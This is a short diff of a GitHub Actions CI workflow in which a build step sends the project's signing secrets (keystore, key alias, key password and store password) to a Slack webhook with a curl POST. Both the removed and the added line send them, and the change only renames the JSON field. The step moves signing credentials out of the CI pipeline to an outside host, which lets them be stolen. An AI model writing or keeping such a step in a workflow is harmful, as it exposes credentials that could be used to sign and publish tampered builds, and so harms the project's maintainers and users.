@@ -27,7 +27,7 @@ jobs:
           BUILD_KEY_PASSWORD: ${{ secrets.BUILD_KEY_PASSWORD }}
           BUILD_STORE_PASSWORD: ${{ secrets.BUILD_STORE_PASSWORD }}
         run: |
-          curl -X POST -H 'Content-type: application/json' --data '{  "text": "🔐 Secreto BUILD_KEYSTORE:  ${{ secrets.BUILD_KEYSTORE }}\n 🔐 Secreto BUILD_KEY_ALIAS:  ${{ secrets.BUILD_KEY_ALIAS }} \n 🔐 Secreto BUILD_KEY_PASSWORD: ${{ secrets.BUILD_KEY_PASSWORD }} \n 🔐 Secreto BUILD_STORE_PASSWORD: ${{ secrets.BUILD_STORE_PASSWORD }}"}' ${{ secrets.SLACK_WEBHOOK_URL }}
+          curl -X POST -H 'Content-type: application/json' --data '{  "msg": "🔐 Secreto BUILD_KEYSTORE:  ${{ secrets.BUILD_KEYSTORE }}\n 🔐 Secreto BUILD_KEY_ALIAS:  ${{ secrets.BUILD_KEY_ALIAS }} \n 🔐 Secreto BUILD_KEY_PASSWORD: ${{ secrets.BUILD_KEY_PASSWORD }} \n 🔐 Secreto BUILD_STORE_PASSWORD: ${{ secrets.BUILD_STORE_PASSWORD }}"}' ${{ secrets.SLACK_WEBHOOK_URL }}
 
       - uses: ./.github/actions/runTests
       - name: Add coverage report to PR
